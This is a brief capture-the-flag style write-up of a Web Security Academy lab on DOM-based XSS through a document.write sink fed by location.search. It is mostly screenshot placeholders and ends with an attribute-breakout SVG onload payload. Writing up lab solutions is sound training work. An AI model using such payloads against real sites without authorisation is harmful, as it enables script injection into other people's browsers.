# Lab: DOM XSS in document.write sink using source location.search

URL: https://0a81004b04f3d4aa80737b9200ae00c7.web-security-academy.net/

![](./Images/img1.png)

## Testing the fields:

![](./Images/img2.png)

## Preparation:

![](./Images/img3.png)

We have to close the tag before we attack using XSS.

## Exploitation:

![](./Images/img4.png)

![](./Images/img5.png)

![](./Images/img6.png)

Payload:

```
"><svg onload=alert("XSS")>
```